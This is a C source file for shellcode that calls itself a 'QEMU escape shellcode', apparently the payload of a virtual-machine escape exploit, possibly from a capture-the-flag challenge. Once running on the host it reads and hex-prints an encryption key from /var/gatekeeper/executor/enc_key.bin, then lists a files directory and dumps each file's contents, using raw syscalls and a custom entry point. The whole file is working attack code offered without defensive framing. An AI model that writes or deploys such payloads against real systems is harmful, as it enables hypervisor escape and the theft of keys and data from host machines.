#include <sys/syscall.h>
typedef unsigned long size_t;
typedef long ssize_t;
typedef unsigned long uintptr_t;
typedef unsigned long uint64_t;
typedef unsigned char uint8_t;

// #define SYS_read 0
// #define SYS_write 1
// #define SYS_open 2
// #define SYS_close 3
// #define SYS_getdents64 217
// #define SYS_exit 60

static const char path[] = "/var/gatekeeper/executor/files";
static const char enc_key_path[] = "/var/gatekeeper/executor/enc_key.bin";

struct linux_dirent64
{
    unsigned long d_ino;
    long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

static long syscall3(long nr, long a, long b, long c)
{
    long ret;
    asm volatile("syscall" : "=a"(ret) : "a"(nr), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
    return ret;
}

static long syscall1(long nr, long a)
{
    long ret;
    asm volatile("syscall" : "=a"(ret) : "a"(nr), "D"(a) : "rcx", "r11", "memory");
    return ret;
}

static size_t my_strlen(const char* s)
{
    size_t i = 0;
    while (s[i])
        i++;
    return i;
}

size_t hex_encode(const void* src, size_t n, char* dst, int uppercase)
{
    const unsigned char* s = (const unsigned char*)src;
    const char* digits = uppercase ? "0123456789ABCDEF" : "0123456789abcdef";
    for (size_t i = 0; i < n; ++i) {
        unsigned char b = s[i];
        dst[2 * i] = digits[(b >> 4) & 0xF];
        dst[2 * i + 1] = digits[b & 0xF];
    }
    dst[2 * n] = '\0';
    return 2 * n;
}

void* my_memcpy(void* dest, const void* src, size_t n)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    for (size_t i = 0; i < n; i++) {
        d[i] = s[i];
    }
    return dest;
}

void write_buf(const char* buf, size_t len)
{
    size_t off = 0;
    while (off < len) {
        long w = syscall3(SYS_write, 1, (long)(buf + off), (long)(len - off));
        if (w <= 0)
            break;
        off += (unsigned long)w;
    }
}

int read_file(const char* filename, uint8_t* out, size_t* length)
{
    int fd = syscall3(SYS_open, (long)filename, 0, 0);
    if (fd < 0) {
        return -1;
    }

    long r = syscall3(SYS_read, fd, (long)out, *length);
    if (r <= 0) {
        syscall1(SYS_close, fd);
        return -1;
    }

    *length = (size_t)r;
    syscall1(SYS_close, fd);
    return 0;
}

void dump_file(const char* filename)
{
    char buf[4096];
    size_t r = sizeof(buf);
    if (read_file(filename, (uint8_t*)buf, &r) < 0) {
        write_buf("Failed to read file: ", 20);
        write_buf(filename, my_strlen(filename));
        write_buf("\n", 1);
        return;
    }

    if (buf[0] == 'P' && buf[1] == 'L' && buf[2] == 'A' && buf[3] == '\0') {
        write_buf("Plain file contents: ", 21);
        write_buf(filename, my_strlen(filename));
        write_buf(" -> ", 4);
        write_buf(buf + 4, r - 4);
    } else {
        write_buf("Unknown file contents: ", 23);
        write_buf(filename, my_strlen(filename));
        write_buf("\n", 1);
    }

    write_buf("\n", 1);
}

void shellcode_main(void)
{
    char msg[] = "Hello from QEMU escape shellcode!\n";
    write_buf(msg, my_strlen(msg));

    // Leak encryption key:
    uint8_t enc_key[16];
    size_t key_len = sizeof(enc_key);
    if (read_file(enc_key_path, enc_key, &key_len) == 0) {
        char hexkey[33];
        hex_encode(enc_key, key_len, hexkey, 0);
        write_buf("Gatekeeper Encryption Key: ", 27);
        write_buf(hexkey, my_strlen(hexkey));
        write_buf("\n", 1);
    } else {
        write_buf("Failed to read encryption key\n", 30);
    }

    long fd = syscall3(SYS_open, (long)path, 0, 0);
    if (fd < 0) {
        syscall1(SYS_exit, 1);
    }

    enum
    {
        BUF_SIZE = 128
    };
    char buf[BUF_SIZE];

    for (;;) {
        long nread = syscall3(SYS_getdents64, fd, (long)buf, BUF_SIZE);
        if (nread == 0)
            break;
        if (nread < 0) {
            syscall1(SYS_close, fd);
            syscall1(SYS_exit, 2);
        }

        unsigned long bpos = 0;
        while (bpos < (unsigned long)nread) {
            struct linux_dirent64* d = (struct linux_dirent64*)(buf + bpos);
            char* name = d->d_name;
            size_t namelen = my_strlen(name);

            char fullpath[256] = { 0 };
            my_memcpy(fullpath, path, my_strlen(path));
            fullpath[my_strlen(path)] = '/';
            my_memcpy(fullpath + my_strlen(path) + 1, name, namelen);
            fullpath[my_strlen(path) + 1 + namelen] = '\0';

            dump_file(fullpath);

            if (d->d_reclen == 0)
                break;
            bpos += d->d_reclen;
        }
    }

    syscall1(SYS_close, fd);
    // do exit group
    syscall1(SYS_exit_group, 0);
    syscall1(SYS_exit, 0);
}

__attribute__((section(".entry"), naked)) void _start()
{
    // asm volatile("mov rsp, %0\n" : : "r"(new_rsp) : "rsp");
    // shellcode_main();
    // syntax intel
    asm volatile(".intel_syntax noprefix\n"
                 "mov rsp, rdi\n"
                 "call shellcode_main\n"
                 ".att_syntax prefix\n");
}
